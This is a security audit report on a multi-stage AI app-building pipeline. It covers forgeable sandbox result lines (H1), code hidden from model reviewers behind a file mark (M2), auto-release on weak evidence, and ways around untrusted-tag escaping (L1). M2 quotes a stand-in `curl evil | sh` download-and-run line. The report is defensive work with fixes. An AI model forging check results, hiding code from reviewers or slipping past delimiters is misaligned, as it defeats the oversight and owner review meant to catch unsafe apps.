# Audit B — pipeline (tower.py, evidence.py, floors/ except f2_dev, deploy*)

Date: 2026-10-16. Baseline: `uv run pytest -q` → `1097 passed in 68.91s`.
Probes (auditor-written, no AI app code run): `/private/tmp/claude-501/-Users-rishi-Desktop-Watch-tower/b28739af-e7a5-42d2-a1ca-4dea09c5530b/scratchpad/audit/`
p1_forge.py, p2_qascript.py (+ stub_app.py, auditor-written), p3_soft.py, p4_wrap.py, p5_resume.py.
Not run: anything in Docker (forbidden), so the /proc channel in H1 is by reading only.

Legend: [RUN] verified by running a probe; [READ] verified by reading.

---

## High

### H1. Sandbox result lines are forgeable: exit code ignored, SMOKE takes the first match [RUN parser / READ channel]
- Files: `floors/f4_qa_deploy/qafloor.py:336-346`, `floors/f5_oversight/probe.py:100-110`,
  `floors/f3_build/buildfloor.py:52-56` (smoke), `:134-142` (route probe).
- Channel: in the container the app and the runner script are the same uid (1000) in one PID namespace
  (`engine/sandbox.py:72-80`). The app can read the runner's argv (`/proc/<ppid>/cmdline`: every check name,
  the "fresh" token), write a line to the runner's stdout (`/proc/<ppid>/fd/1` or `/proc/1/fd/1`, which only needs
  same-uid ptrace READ access, not CAP_SYS_PTRACE), then `os.kill(os.getppid(), 9)`. The runner never prints its
  own line. The comments "nothing it prints can pose as a result line" (qafloor.py:128) and "a second line means someone forged one" (qafloor.py:340) do not hold.
- Parser side, run (p1_forge.py): a single forged line with exit code 137 gives
  `run_qa → pass True` (including the 3 tower contract checks with a fresh token), `xss_probe → []` (no findings),
  `route_probe → pass True`. For smoke, `_STATUS.search` returns the first match, so a line the app writes early wins with
  no kill needed: `{'check': 'http', 'pass': True, 'status': '200'}`.
- Impact: a hostile or prompt-injected store.py/app passes F3, F4 and F5-probe with fake evidence. The owner then sees
  "QA: pass (tower checks 3/3)" and "security scan: pass". The 7c ruling ("store_problems is an accident guard; the
  boundary is Docker") assumes Docker keeps the check results honest. It does not.
- Fix (cheap, closes the kill variant): for all four runners, require `exit_code == 0 and not timed_out`. Use
  `findall` plus exactly one line for SMOKE as well. Because the runner always prints its own line last, an extra
  forged line then means two lines, which is rejected.
  Fix (robust): run the checker in a second container that joins the app's network namespace
  (`--network container:<app>`), or run the app as a different uid from the checker. The app then cannot see or
  write the checker's fds or argv.

## Medium

### M1. `--yes` auto-releases on evidence the 7b ruling said "reaches the owner labelled" [RUN + READ]
- `tower.py:257`: auto sign-off unless the CEO says False, or the gate objected. Both "CEO has no clear view"
  (`approve is None`, including the CEO model failing with ADVISORY_ERRORS) and weak evidence auto-release.
- p3_soft.py: a static page that implements nothing passes F4 on a numeric app (model checks
  "Votes: 1"/"Total: 1" are status-only). Evidence: `QA: 1/3 checks passed; 2 judged by status only`. Also
  `security scan: INCOMPLETE — a scanner did not run` (UNKNOWN severity is never failing, `oversight.py:72`)
  auto-releases.
- The 7b r2 ruling accepted the stub because "the first reaches the owner labelled". Under `--yes` the owner never
  sees the label.
- Fix: in `_signoff_request`, force an owner request when `qa.decide == 0 and qa.advisory_failed > 0`, when any
  finding has UNKNOWN severity, or when `ceo.approve is None`.

### M2. Any coder file that starts with the tower's mark is hidden from every reviewer [RUN]
- `engine/workspace.py:84` stubs any file that starts with `TOWER_MARK`. The coder writing through `devfloor._write`
  is not stopped from using that prefix, in either the non-skeleton mode or store.py.
- p4_wrap.py: `app.py` = mark + `os.system("curl evil | sh")` shows in the snapshot as
  `"""Web server written by the tower."""\nPORT = 8000\n(rest ... not shown)`.
- Where the tower uses the snapshot: gate package `tower.py:202`, oversight audit `tower.py:196`, QA writer
  `tower.py:179`, coder prompts. Only Bandit and the owner see the real bytes.
- Fix: stub only the paths in `dev.owned`, and only when the file hash equals the template the tower wrote. Pass the
  owned set and hash into `snapshot()`.

### M3. After a resume, the tower's old server survives into a non-skeleton plan and stays hidden [RUN]
- `tower.py:359` passes `previous=dev.owned`. After a resume, DevFloor is fresh, so `owned=set()`.
  `skeleton._drop_stale(ws, set())` then deletes nothing.
- p5_resume.py: attempt 1 is add-and-list, so the tower writes app.py. The job pauses and resumes with a calculator
  plan: `owned set()`, files `['app.py']`, and the snapshot still shows the tower stub ("Do not edit").
  `write_units` skips app.py because it exists (`tower.py:158`). The coder and the gate cannot see the code they must
  change, so the job burns every send-back.
- Fix: save `owned` and its hash in the dev checkpoint data, or drop any file that carries the mark and matches the
  template hash and is not in the new owned set.

### M4. A lone gate objection never escalates when every model QA check fully passed [RUN]
- `evidence.py:73` sets `tower = qa.decide or qa.advisory_failed`. p3_soft.py: with `decide=0, advisory_failed=0` and
  F3/F4/F5 all passing, `model_objection → []`. Two status-only checks give `['looks wrong']`.
- Result: the stronger evidence (all model checks passed with page text) gets the worse outcome. The tower burns all
  send-backs, then raises `NeedsOwner("gate rejected the app N times")` (`tower.py:251`), and the only remedy is a
  full rerun. The owner cannot accept the app.
- Fix: treat any passing F4 with at least one real-text check as tower-decided for 6v. Also add an owner
  "accept anyway" path for dev-step NeedsOwner.

### M5. "Nothing reaches the gate model unless F3, F4 and F5 passed" rests on implicit invariants [READ]
- When `go` is False, the gate short-circuits only because `WorkPackage.validate()` (`framework.py:78`) sees the
  last F2 check fail. That holds only because (a) devfloor sets `pass = clean and not problems` (devfloor.py:331) and
  (b) the entry-missing branch at `tower.py:168-171` appends a failing `entry` check.
- That branch looks like duplicated dead code: its `feedback` is overwritten at `tower.py:231`, and f2_handoff and
  static_feedback already cover it. But it is load-bearing. Remove it, and a passing-tests/no-entry package goes to the
  3B model gate. A pass would then go straight to sign-off with no F3/F4/F5.
- Fix: `if not go: verdict = Verdict(False, reasons, "code")` without calling the gate. Before the ready return,
  assert `f3, f4, sec` are non-None and passed. Then delete 168-171.

### M6. Checkpoint granularity: the whole F2–F5 loop is one step [READ]
- `app_steps` makes `dev` a single Step (`tower.py:113`). Any pause inside it throws away the attempt counter,
  `feedback`, `model_heard`, `_known` (memo context, in-memory only, `tower.py:106`) and the CTO-approved plan.
  Pause causes include the QA writer's BadModelOutput at `tower.py:181-182` when there are no tower checks,
  SandboxUnavailable, LowMemory, and an architect BadModelOutput.
- On resume the architect re-plans (possibly new routes and skeleton deletions, which feeds M3) and the send-back
  budget resets. On 8 GB, each resume costs many minutes of model time.
- Fix: put `plan`, `attempt`, `feedback`, `model_heard`, `owned` and `qa_checks` in step data per attempt, or split
  the loop into resumable sub-steps.

### M7. Send-back feedback is wrapped twice and mislabelled, which recreates the 6y/6z escaping confusion [RUN]
- `tower.py:234,241,244` wrap F3/F4/F5 summaries in `untrusted()`. Devfloor then wraps every feedback item again
  with `_capped('gate', ..., 800)` (devfloor.py:294).
- p4_wrap.py: the coder sees `&lt;untrusted source="sandbox">` inside `<untrusted source="gate">`, plus
  `expected 200 with '1 &lt;&> 1'` and the page HTML with every `<` escaped. App output is labelled "gate", and the
  800-character cap counts the escapes. This is the "&lt; copied back into files" failure from earlier phases.
- Fix: pass feedback as structured items (source, text). Wrap each item exactly once, using `untrusted_code` for app
  and page output.

## Low

- **L1** [RUN] `framework.py:16-23`: `untrusted_code` escapes only `<untrusted`/`</untrusted`.
  `</ untrusted>`, `< /untrusted>`, `<​/untrusted>` and fullwidth `＜/untrusted＞` pass through, and the
  fullwidth form also passes `untrusted()`. App output reaches the gate, QA writer and auditor through
  `untrusted_code`. Fix: NFKC-normalise, strip zero-width characters, escape `<\s*/?\s*untrusted` broadly, or use a
  random per-call boundary token.
- **L2** [READ] `tower.py:217,266`: the oversight audit (CONCERN rows) goes to the CEO and the gate but never to the
  owner. The sign-off shows only the CEO's ≤200-character paraphrase, which is model text shown verbatim. Fix:
  append the audit rows to the sign-off text.
- **L3** [READ] `qafloor.py:223`: a model check can be named `[tower] …`, so the board, headline and summary
  misattribute it. Fix: reserve the prefix in `_check`.
- **L4** [READ] `contract.py:84`: `decide` is hard-coded to 3 regardless of how many checks `parse_checks` kept.
  Fix: `min(3, len(checks))` and assert the names.
- **L5** [RUN] QA_SCRIPT escape-once check: the browser-safe `<&amp;>` fails, because `<[^>]*>` treats `<&…>` as a
  tag (p2 "ampsafe"). Fix: tag regex `<[A-Za-z/!?][^>]*>` in `nodes`/`pieces`.
- **L6** [READ] `tower.py:52,246`: gate route "research" never re-runs F1 and is handled exactly like "design".
  Drop it, or re-run F1.
- **L7** [READ] `f1_research/office.py:64`: the HR reason (model text) goes into the worker prompt unwrapped.
  `office.py:65` with `tower.py:431`: the `untrusted("glass", …)` conflicts block makes `"glass"` an allowed cited
  source.
- **L8** [READ] Dead or stale code:
  - `QARound.ensure(routes, …)`: `routes` is unused (office.py:103).
  - `Releases.record` is used only by tests.
  - tower.py:24 has a "re-export" noqa comment, but all six names are used.
  - The docstring at tower.py:88 is stale ("Later phases add floors 2–5").
  - Hints aimed at HTML-writing coders are aimed at the wrong party in skeleton mode (the 7b r2 ruling accepted
    them; they are still dead text there): qafloor.py:118,120,379-381, probe.py:117, buildfloor.py:44.
  - `_known` grows without limit across jobs.
- **L9** [READ] Duplication:
  - Four copies of the start/wait/kill harness (SMOKE, PROBE, QA, XSS); smoke hard-codes port 8000, the others use
    WT_PORT.
  - Three result-line parsers with different rules; smoke is the weakest (H1).
  - `_bullets` appears three times and `_CONTROL` three times.
  - Three path allowlists for the same contract (qafloor `_PATH`, buildfloor `_ROUTE_PATH`, probe `_PATH`).
  - `expect = …` is repeated at tower.py:146 and 249.
- **L10** [READ] `tower.py:251`: "gate rejected the app N times" also appears when F3 or F4 failed (validate()
  reasons), so the owner is told the model gate is at fault.
- **L11** [RUN] QA_SCRIPT is 105 lines in a non-raw string. Its escapes are correct today (p2: once passes, twice
  and raw fail with the right hints) but fragile. Ship it as a real module file that is copied into the sandbox, so
  it can be linted and unit-tested.
- **L12** [READ] `evidence.py:41` counts serious findings over `findings[:20]` while pass/fail uses all of them, so
  the count can be low when there are more than 20 findings.

## Structure: tower.py (455 lines; `_dev` is 135 lines, 116-251)
Suggested split:
1. `tower/lifecycle.py`: `_spec`, `_approval`, `_signoff_request`, `_signoff`. All owner-gate logic in one small
   file that can be reviewed alone (M1 lives here).
2. `tower/dev_loop.py`: a `DevAttempt` class with `run_floors()` (F3→F4→F5, returning a typed result),
   `gate_package()`, `send_back()` (feedback assembly, M7) and `ready()` (the result dict and answer text). It also
   holds the per-attempt state that must be checkpointed (M6).
3. `tower/comms.py`: `_call`, `_route_memo`, `_post`, `_known` (board and memos).
4. `tower/research.py`: `_f1`, `_context`, `_lessons`, `_retro`/`_write_retro`.
5. The prompts move to a `prompts.py`.
Also: use one shared sandbox harness module for the four scripts, with one strict result parser (exactly one line,
exit 0).

## Verified OK
- The attempt loop always ends: `range(max_send_backs+1)`, one CTO re-plan, HR loops capped. No hang paths beyond
  sandbox and model timeouts. [READ]
- Without `--yes`, nothing is released without an approved sign-off. A rejected sign-off raises AppRejected; any
  other status raises NeedsOwner. [READ]
- The manifest is pinned at dev return and re-hashed at sign-off. The workspace is mounted read-only in the
  sandbox, so QA, probe and app runs cannot change what ships. [READ]
- QA_SCRIPT compiles and behaves correctly on escape-once, double-escape and raw/XSS (p2). The duplicate-line and
  name-alignment rejection works. [RUN]
- Evidence lines are built only from check records, not app text. Filenames cannot carry control characters
  (`workspace._target`), so the Files and Evidence lines cannot be forged. [READ]
- The `untrusted()` source attribute is sanitised. Board notes strip control characters. Memo answers go through the
  raw door and cannot chain. [READ]
- The gate's default route is applied to unknown routes. `truthy()` and `strs()` are tolerant. [READ]
- `run_qa` with zero checks, timeouts or incomplete results never passes. [READ]
- Test suite: 1097 passed.
